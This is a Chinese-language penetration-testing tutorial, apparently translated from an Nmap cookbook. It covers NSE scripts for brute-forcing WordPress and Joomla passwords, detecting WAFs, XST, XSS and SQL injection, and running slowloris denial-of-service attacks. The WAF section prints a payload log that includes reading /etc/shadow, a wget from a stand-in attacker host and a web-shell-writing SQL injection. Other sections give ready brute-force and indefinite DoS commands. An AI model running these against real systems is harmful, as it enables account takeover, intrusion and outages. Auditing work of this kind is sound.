## 如何做...

要查找 WordPress 安装中具有弱密码的帐户，请使用以下 Nmap 命令：

```
$ nmap -p80 --script http-wordpress-brute <target>

```

找到的所有有效帐户将显示在结果中：

```
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
| http-wordpress-brute:
|   Accounts
|     papa:a1b2c3d4 => Login correct
|   Statistics
|_    Perfomed 360 guesses in 17 seconds, average tps: 6

```

## 它是如何工作的...

参数`-p80 –script http-wordpress-brute`在端口 80（`-p80`）上找到 Web 服务器时启动 NSE 脚本`http-wordpress-brute`。我开发了这个脚本，以免在对 WordPress 安装使用`http-brute`时设置 WordPress URI 和用户名和密码的 HTML 变量名称。

此脚本使用以下默认变量：

+   `uri`：`/wp-login.php`

+   `uservar`：`log`

+   `passvar`：`pwd`

## 还有更多...

要设置线程数，请使用脚本参数`http-wordpress-brute.threads`：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=5 <target>

```

如果服务器有虚拟主机，请使用参数`http-wordpress-brute.hostname`设置主机字段：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.hostname="ahostname.wordpress.com" <target>

```

要设置不同的登录 URI，请使用参数`http-wordpress-brute.uri`：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.uri="/hidden-wp-login.php" <target>

```

要更改存储用户名和密码的`POST`变量的名称，请设置参数`http-wordpress-brute.uservar`和`http-wordpress-brute.passvar`：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.uservar=usuario,http-wordpress-brute.passvar=pasguord <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-wordpress-brute --script-args http.useragent="Mozilla 42" <target>

```

### Brute 模式

Brute 库支持改变攻击中使用的组合的不同模式。可用的模式有：

+   `user`：在此模式中，对于`userdb`中列出的每个用户，将尝试`passdb`中的每个密码

```
$ nmap --script http-wordpress-brute --script-args brute.mode=user <target>

```

+   `pass`：在此模式中，对于`passdb`中列出的每个密码，将尝试`usedb`中的每个用户

```
$ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>

```

+   `creds`：此模式需要额外的参数`brute.credfile`

```
$ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

```

## 另请参阅

+   检测可能的 XST 漏洞食谱

+   在各种 Web 服务器上发现有趣的文件和目录的食谱

+   检测 Web 应用防火墙食谱

+   暴力破解 HTTP 身份验证食谱

+   滥用 mod_userdir 列举用户帐户的食谱

+   *Testing default credentials in web applications* 配方

+   *Brute-force password auditing Joomla! installations* 配方

+   *Finding SQL injection vulnerabilities in web applications* 配方

+   *Detecting web servers vulnerable to slowloris denial of service attacks* 配方

# Brute-force password auditing Joomla! installations

Joomla！是一个非常流行的 CMS，用于许多不同的目的，包括电子商务。检测具有弱密码的用户帐户是渗透测试人员的常见任务，Nmap 通过使用 NSE 脚本`http-joomla-brute`来帮助实现这一点。

此配方展示了如何对 Joomla！安装进行暴力密码审核。

## 如何做...

打开终端并输入以下命令：

```
$ nmap -p80 --script http-joomla-brute <target>

```

找到的所有有效帐户将被返回：

```
PORT     STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-joomla-brute:
|   Accounts
|     king:kong => Login correct
|   Statistics
|_    Perfomed 799 guesses in 501 seconds, average tps: 0

```

## 工作原理...

参数`-p80 –script http-joomla-brute`在端口 80（`-p80`）上发现 Web 服务器时启动 NSE 脚本`http-joomla-brute`。我开发了这个脚本来对 Joomla！安装进行暴力密码审核。

脚本`http-joomla-brute`使用以下默认变量：

+   `uri`：`/administrator/index.php`

+   `uservar`：`用户名`

+   `passvar`：`密码`

## 还有更多...

使用以下命令设置参数`http-joomla-brute.threads`来设置线程数：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.threads=5 <target>

```

要在 HTTP 请求中设置`Host`字段，请使用以下命令设置脚本参数`http-joomla-brute.hostname`：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.hostname="hostname.com" <target>

```

通过使用以下命令指定参数`http-joomla-brute.uri`来设置不同的登录 URI：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.uri="/joomla/admin/login.php" <target>

```

要更改存储用户名和密码的`POST`变量的名称，请使用以下命令设置参数`http-joomla-brute.uservar`和`http-joomla-brute.passvar`：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.uservar=usuario,http-joomla-brute.passvar=pasguord <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-wordpress-brute --script-args http.useragent="Mozilla 42" <target>

```

### Brute 模式

Brute 库支持不同的模式，可以改变攻击中使用的组合。可用的模式有：

+   `user`：在此模式下，将尝试`userdb`中列出的每个用户的每个密码

```
$ nmap --script http-wordpress-brute --script-args brute.mode=user <target>

```

+   `pass`：在此模式下，将尝试`passdb`中列出的每个密码的每个用户

```
$ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>

```

+   `creds`：此模式需要额外的参数`brute.credfile`

```
$ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

```

## 另请参阅

+   *Detecting possible XST vulnerabilities* 配方

+   在各种网络服务器上发现有趣文件和目录的配方

+   *Brute forcing HTTP authentication* 配方

+   *Abusing mod_userdir to enumerate user accounts* 配方

+   *Testing default credentials in web applications* 配方

+   *Brute-force password auditing WordPress installations* 配方

+   *Detecting web servers vulnerable to slowloris denial of service attacks* 配方

# 检测 Web 应用防火墙

Web 服务器通常受到数据包过滤系统的保护，该系统会丢弃或重定向可疑的恶意数据包。Web 渗透测试人员受益于知道在他们和目标应用程序之间有一个流量过滤系统。如果是这种情况，他们可以尝试更罕见或隐秘的技术来尝试绕过 Web 应用防火墙（WAF）或入侵防御系统（IPS）。这也有助于他们确定漏洞在当前环境中是否实际可利用。

此配方演示了如何使用 Nmap 检测数据包过滤系统，如 Web 应用防火墙或入侵防御系统。

## 如何做...

检测 Web 应用防火墙或入侵防御系统：

```
$ nmap -p80 --script http-waf-detect <target>

```

脚本`http-waf-detect`将告诉您是否检测到了数据包过滤系统：

```
PORT   STATE SERVICE
80/tcp open  http
|_http-waf-detect: IDS/IPS/WAF detected

```

## 工作原理...

参数`-p80 --script http-waf-detect`在发现运行在端口 80 上的 Web 服务器时启动 NSE 脚本`http-waf-detect`。我开发了`http-waf-detect`来确定是否通过 Web 应用防火墙（WAF）或入侵防御系统（IPS）过滤了带有恶意有效负载的 HTTP 请求。

该脚本通过保存安全的 HTTP`GET`请求的状态码和可选的页面主体，并将其与包含最常见 Web 应用程序漏洞的攻击载荷的请求进行比较。因为每个恶意载荷都存储在一个奇数变量名中，所以它几乎不可能被 Web 应用程序使用，只有数据包过滤系统会做出反应并改变任何返回的状态码，可能会收到 HTTP 状态码 403（禁止）或页面内容。

## 还有更多...

要检测响应主体的变化，请使用参数`http-waf-detect.detectBodyChanges`。我建议在处理动态内容较少的页面时启用它：

```
$ nmap -p80 --script http-waf-detect --script-args="http-waf-detect.detectBodyChanges" <target>

```

要包含更多的攻击载荷，请使用脚本参数`http-waf-detect.aggro`。这种模式会生成更多的 HTTP 请求，但也可能触发更多的产品：

```
$ nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro" <target>
Initiating NSE at 23:03
NSE: http-waf-detect: Requesting URI /abc.php
NSE: Final http cache size (1160 bytes) of max size of 1000000
NSE: Probing with payload:?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd
NSE: Probing with payload:?p4yl04d2=1%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables
NSE: Probing with payload:?p4yl04d3=<script>alert(document.cookie)</script>
NSE: Probing with payload:?p4yl04d=cat%20/etc/shadow
NSE: Probing with payload:?p4yl04d=id;uname%20-a
NSE: Probing with payload:?p4yl04d=<?php%20phpinfo();%20?>
NSE: Probing with payload:?p4yl04d='%20OR%20'A'='A
NSE: Probing with payload:?p4yl04d=http://google.com
NSE: Probing with payload:?p4yl04d=http://evilsite.com/evilfile.php
NSE: Probing with payload:?p4yl04d=cat%20/etc/passwd
NSE: Probing with payload:?p4yl04d=ping%20google.com
NSE: Probing with payload:?p4yl04d=hostname%00
NSE: Probing with payload:?p4yl04d=<img%20src='x'%20onerror=alert(document.cookie)%20/>
NSE: Probing with payload:?p4yl04d=wget%20http://ev1l.com/xpl01t.txt
NSE: Probing with payload:?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php'--

```

要为探测设置不同的 URI，请设置参数`http-waf-detect.uri`：

```
$ nmap -p80 --script http-waf-detect --script-args http-waf-detect.uri=/webapp/ <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-waf-detect --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线化

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能加快 NSE HTTP 脚本的执行速度，建议在 Web 服务器支持的情况下使用。HTTP 库默认尝试管线化 40 个请求，并根据`Keep-Alive`头部根据流量条件自动调整该数字。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到管线中的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *暴力破解 HTTP 身份验证*配方

+   *滥用 mod_userdir 来枚举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

+   *在 Web 应用程序中查找 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 检测可能的 XST 漏洞

跨站跟踪（XST）漏洞是由 Web 服务器中启用了 HTTP 方法`TRACE`的存在**跨站脚本（XSS）漏洞**引起的。这种技术主要用于绕过指令`httpOnly`强加的 cookie 限制。渗透测试人员可以使用 Nmap 来快速确定 Web 服务器是否启用了`TRACE`方法，从而节省时间。

这个配方描述了如何使用 Nmap 来检查`TRACE`是否启用，从而可能存在跨站跟踪（XST）漏洞。

## 如何做...

打开终端并输入以下命令：

```
$ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest <target>

```

如果`TRACE`已启用并可访问，我们应该看到类似于这样的东西：

```
PORT    STATE SERVICE
80/tcp  open  http
|_http-trace: TRACE is enabled
| http-methods: GET HEAD POST OPTIONS TRACE
| Potentially risky methods: TRACE
| See http://nmap.org/nsedoc/scripts/http-methods.html
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
| OPTIONS / -> HTTP/1.1 200 OK
|
|_TRACE / -> HTTP/1.1 200 OK

```

否则，`http-trace`将不返回任何内容，`TRACE`将不会列在`http-methods`下：

```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: GET HEAD POST OPTIONS
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
|_OPTIONS / -> HTTP/1.1 200 OK

Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds

```

## 它是如何工作的...

参数`-p80 --script http-methods,http-trace --script-args http-methods.retest`告诉 Nmap 在检测到 Web 服务器时在端口 80 上启动 NSE 脚本`http-methods`和`http-trace`，并分别测试 HTTP`OPTIONS`请求返回的每种方法。

`http-methods`由 Bernd Stroessenreuther 提交，它发送一个`OPTIONS`请求来枚举 Web 服务器支持的方法。

脚本`http-trace`是我写的，它的目的是检测 HTTP 方法`TRACE`的可用性。它只是发送一个`TRACE`请求，并寻找状态码 200，或者服务器回显相同的请求。

## 还有更多...

通过设置脚本参数`http-methods.retest`，我们可以测试`OPTIONS`列出的每个 HTTP 方法，并分析返回值以得出`TRACE`是否可访问且未被防火墙或配置规则阻止的结论。

```
$ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest <target>
PORT    STATE SERVICE
80/tcp  open  http
|_http-trace: TRACE is enabled
| http-methods: GET HEAD POST OPTIONS TRACE
| Potentially risky methods: TRACE
| See http://nmap.org/nsedoc/scripts/http-methods.html
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
| OPTIONS / -> HTTP/1.1 200 OK
|
|_TRACE / -> HTTP/1.1 200 OK

```

请记住，方法`TRACE`可能已启用但未列在`OPTIONS`中，因此运行`http-methods`和`http-trace`两个脚本以获得更好的结果非常重要。

使用参数`http-trace.path`和`http-methods.url-path`来请求与根文件夹（`/`）不同的路径：

```
$ nmap -p80 --script http-methods,http-trace --script-args http-methods.retest,http-trace.path=/secret/,http-methods.url-path=/secret/ <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-trace --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   *检查 HTTP 代理是否开放*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *在 Web 应用程序中查找 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 在 Web 应用程序中检测跨站脚本漏洞

跨站脚本漏洞允许攻击者伪造内容，窃取用户 cookie，甚至在用户浏览器上执行恶意代码。甚至还有像`Beef`这样的高级利用框架，允许攻击者通过 JavaScript 挂钩执行复杂的攻击。Web 渗透测试人员可以使用 Nmap 以自动化的方式发现 Web 服务器中的这些漏洞。

此配方显示了如何使用 Nmap NSE 在 Web 应用程序中查找跨站脚本漏洞。

## 如何做...

要扫描 Web 服务器以查找易受跨站脚本（XSS）攻击的文件，我们使用以下命令：

```
$ nmap -p80 --script http-unsafe-output-escaping  <target>

```

所有被怀疑易受攻击的文件将被列出：

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-unsafe-output-escaping: 
|_  Characters [> " '] reflected in parameter id at http://target/1.php?id=1

```

脚本输出还将包括易受攻击的参数以及未经过滤或编码返回的字符。

如果您正在使用 PHP 服务器，请改用以下 Nmap 命令：

```
$nmap -p80 --script http-phpself-xss,http-unsafe-output-escaping <target>

```

对于具有易受攻击文件的 Web 服务器，您将看到类似于下面显示的输出：

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-phpself-xss: 
|   VULNERABLE:
|   Unsafe use of $_SERVER["PHP_SELF"] in PHP files
|     State: VULNERABLE (Exploitable)
|     Description:
|       PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
| 
|     Extra information:
| 
|   Vulnerable files with proof of concept:
|     http://calder0n.com/sillyapp/three.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|     http://calder0n.com/sillyapp/secret/2.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|     http://calder0n.com/sillyapp/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|     http://calder0n.com/sillyapp/secret/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=calder0n.com
|     References:
|       http://php.net/manual/en/reserved.variables.server.php
|_      https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
| http-unsafe-output-escaping: 
|_  Characters [> " '] reflected in parameter hola at http://calder0n.com/sillyapp/secret/1.php?hola=1

```

## 它是如何工作的...

脚本`http-unsafe-output-escaping`由 Martin Holst Swende 编写，它会爬取 Web 服务器以检测基于用户输入的 Web 应用程序返回输出的可能问题。脚本会将以下有效负载插入到它找到的所有参数中：

```
ghz%3Ehzx%22zxc%27xcv

```

上面显示的有效负载旨在检测可能导致跨站脚本漏洞的字符`> " '。

我编写了脚本`http-phpself-xss`来检测由于未对`$_SERVER["PHP_SELF"']`脚本进行消毒而导致的跨站脚本漏洞。该脚本将爬取 Web 服务器以查找所有具有`.php`扩展名的文件，并将以下有效负载附加到每个 URI：

```
/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E

```

如果网站上反映了相同的模式，这意味着页面不安全地使用了变量`$_SERVER["PHP_SELF"]`。

脚本`http-unsafe-output-escaping`和`http-phpself-xss`的官方文档可以在以下 URL 找到：

+   [`nmap.org/nsedoc/scripts/http-phpself-xss.html`](http://nmap.org/nsedoc/scripts/http-phpself-xss.html)

+   [`nmap.org/nsedoc/scripts/http-unsafe-output-escaping.html`](http://nmap.org/nsedoc/scripts/http-unsafe-output-escaping.html)

## 还有更多...

脚本`http-unsafe-output-escaping`和`http-phpself-xss`依赖于库`httpspider`。可以配置此库以增加其覆盖范围和整体行为。

例如，该库默认只会爬取 20 页，但我们可以相应地设置参数`httpspider.maxpagecount`以适应更大的网站：

```
$nmap -p80 --script http-phpself-xss --script-args httpspider.maxpagecount=200 <target>

```

另一个有趣的参数是`httpspider.withinhost`，它限制了网络爬虫到给定的主机。这是默认开启的，但如果您需要测试相互链接的一组 Web 应用程序，您可以使用以下命令：

```
$nmap -p80 --script http-phpself-xss --script-args httpspider.withinhost=false <target>

```

我们还可以设置要覆盖的目录的最大深度。默认情况下，此值仅为`3`，因此，如果注意到 Web 服务器具有深度嵌套的文件，特别是在实现“美化 URL”时，例如[/blog/5/news/comment/](http:///blog/5/news/comment/)，建议使用以下命令更新此库参数：

```
$nmap -p80 --script http-phpself-xss --script-args httpspider.maxdepth=10 <target>

```

该库的官方文档可以在[`nmap.org/nsedoc/lib/httpspider.html`](http://nmap.org/nsedoc/lib/httpspider.html)找到。

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sql-injection --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线化

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能会加快 NSE HTTP 脚本的执行速度，如果 Web 服务器支持，建议使用。默认情况下，HTTP 库尝试管线化 40 个请求，并根据流量条件自动调整该数字，基于`Keep-Alive`标头。

```
$ nmap -p80 --script http-sql-injection --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到管线的最大 HTTP 请求数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *检测 Web 应用程序防火墙*配方

+   *检测 Web 应用程序中的 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 在 Web 应用程序中查找 SQL 注入漏洞

SQL 注入漏洞是由于未对用户输入进行消毒而引起的，它们允许攻击者执行可能危及整个系统的 DBMS 查询。这种类型的 Web 漏洞非常常见，因为必须测试每个脚本变量，因此检查此类漏洞可能是一项非常乏味的任务。幸运的是，我们可以使用 Nmap 快速扫描 Web 服务器，查找 SQL 注入的易受攻击文件。

此配方展示了如何使用 Nmap NSE 在 Web 应用程序中查找 SQL 注入漏洞。

## 如何做...

要使用 Nmap 扫描 Web 服务器，查找易受 SQL 注入攻击的文件，请使用以下命令：

```
$ nmap -p80 --script http-sql-injection <target>

```

所有易受攻击的文件将显示可能存在漏洞的参数：

```
 PORT   STATE SERVICE
 80/tcp open  http    syn-ack
 | http-sql-injection: 
 |   Possible sqli for queries:
 |_    http://xxx/index.php?param=13'%20OR%20sqlspider

```

## 它是如何工作的...

脚本`http-sql-injection.nse`由 Eddie Bell 和 Piotr Olma 编写。它会爬行 Web 服务器，查找带有参数的表单和 URI，并尝试查找 SQL 注入漏洞。脚本通过插入可能导致应用程序出错的 SQL 查询来确定服务器是否存在漏洞。这意味着脚本不会检测到任何盲目的 SQL 注入漏洞。

脚本匹配的错误消息是从默认位置`/nselib/data/http-sql-errors.lst`中读取的外部文件。此文件来自`fuzzdb`项目（[`code.google.com/p/fuzzdb/`](http://code.google.com/p/fuzzdb/)），用户可以根据需要选择替代文件。

## 还有更多...

`httpspider`库的行为可以通过库参数进行配置。默认情况下，它使用相当保守的值来节省资源，但在全面测试期间，我们需要调整其中的几个参数以获得最佳结果。例如，默认情况下，该库只会爬行 20 页，但我们可以根据需要设置参数`httpspider.maxpagecount`以适应更大的站点，如以下命令所示：

```
$ nmap -p80 --script http-sql-injection --script-args httpspider.maxpagecount=200 <target>

```

另一个有趣的参数是`httpspider.withinhost`，它限制 Web 爬虫到给定的主机。默认情况下已启用，但如果需要测试相互链接的一组 Web 应用程序，可以使用以下命令：

```
$ nmap -p80 --script http-sql-injection --script-args httpspider.withinhost=false <target>

```

我们还可以设置要覆盖的目录的最大深度。默认情况下，此值仅为`3`，因此如果您注意到 Web 服务器具有深度嵌套的文件，特别是在实现了“pretty urls”（例如`/blog/5/news/comment/`）时，建议您更新此库参数：

```
$ nmap -p80 --script http-sql-injection --script-args httpspider.maxdepth=10 <target>

```

该库的官方文档可在[`nmap.org/nsedoc/lib/httpspider.html`](http://nmap.org/nsedoc/lib/httpspider.html)找到。

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sql-injection --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线化

一些 Web 服务器允许将一个以上的 HTTP 请求封装在一个数据包中。这可能会加快 NSE HTTP 脚本的执行速度，建议在 Web 服务器支持的情况下使用。HTTP 库默认尝试将 40 个请求进行管线化，并根据`Keep-Alive`标头根据流量情况自动调整该数字。

```
$ nmap -p80 --script http-sql-injection --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到管线的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$ nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*食谱

+   *检测 Web 应用程序防火墙*食谱

+   在 Web 应用程序中检测跨站脚本漏洞的*检测*食谱

+   *检测易受 slowloris 拒绝服务攻击影响的 Web 服务器*食谱

# 检测易受 slowloris 拒绝服务攻击影响的 Web 服务器

拒绝服务攻击在当今非常流行，Nmap 可以帮助渗透测试人员检测易受此类攻击影响的 Web 服务器。据推测，“slowloris 拒绝服务”技术是由 Adrian Ilarion Ciobanu 于 2007 年发现的，但 Rsnake 在 DEFCON 17 中发布了第一个工具，证明它影响了包括 Apache 1.x，Apache 2.x，dhttpd 在内的多种产品，可能还有许多其他 Web 服务器。

此食谱展示了如何使用 Nmap 检测 Web 服务器是否容易受到 slowloris DoS 攻击的影响。

## 如何做...

要使用 Nmap 对远程 Web 服务器发起 slowloris 攻击，请使用以下命令：

```
# nmap -p80 --script http-slowloris --max-parallelism 300 <target>

```

结果包括一些攻击统计数据：

```
PORT   STATE SERVICE REASON 
80/tcp open  http    syn-ack
| http-slowloris:
|   Vulnerable:
|   the DoS attack took +5m35s
|   with 300 concurrent connections
|_  and 900 sent queries

```

## 它是如何工作的...

参数`-p80 --script http-slowloris`在端口 80（`-p80`）检测到 Web 服务器时启动 NSE 脚本`http-slowloris`。

slowloris DoS 技术的工作方式与其他拒绝服务技术不同，其他技术会通过请求淹没通信渠道。Slowloris 使用最小的带宽，不会消耗大量资源，只发送最少量的信息以保持连接不关闭。

RSnake 的官方说明可在[`ha.ckers.org/slowloris/`](http://ha.ckers.org/slowloris/)找到。

NSE 脚本由 Aleksandar Nikolic 和 Ange Gutek 编写。官方文档可在以下网址找到：

[`nmap.org/nsedoc/scripts/http-slowloris.html`](http://nmap.org/nsedoc/scripts/http-slowloris.html)

## 还有更多...

要设置每个 HTTP 标头之间的时间，请使用以下命令中的脚本参数`http-slowloris.send_interval`：

```
$ nmap -p80 --script http-slowloris --script-args http-slowloris.send_interval=200 --max-parallelism 300

```

要在一定时间内运行 slowloris 攻击，请使用以下命令中显示的脚本参数`http-slowloris.timelimit`：

```
$ nmap -p80 --script http-slowloris --script-args http-slowloris.timelimit=15m <target>

```

或者，还有一个参数可用于告诉 Nmap 无限期地攻击目标，如以下命令所示：

```
$ nmap -p80 --script http-slowloris --script-args http-slowloris.runforever <target>

```

还有另一个用于检查易受攻击的 Web 服务器的 NSE 脚本，名为`http-slowloris-check`，由 Aleksandar Nikolic 编写。此脚本仅发送两个请求，并且它使用巧妙的方法通过读取和比较连接超时来检测易受攻击的服务器：

```
$ nmap -p80 --script http-slowloris-check <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-slowloris --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   检测可能的 XST 漏洞的方法

+   发现各种 Web 服务器上有趣的文件和目录的方法

+   检测 Web 应用程序防火墙的方法

+   在 Web 应用程序中测试默认凭据的方法

+   在 Web 应用程序中找到 SQL 注入漏洞的方法
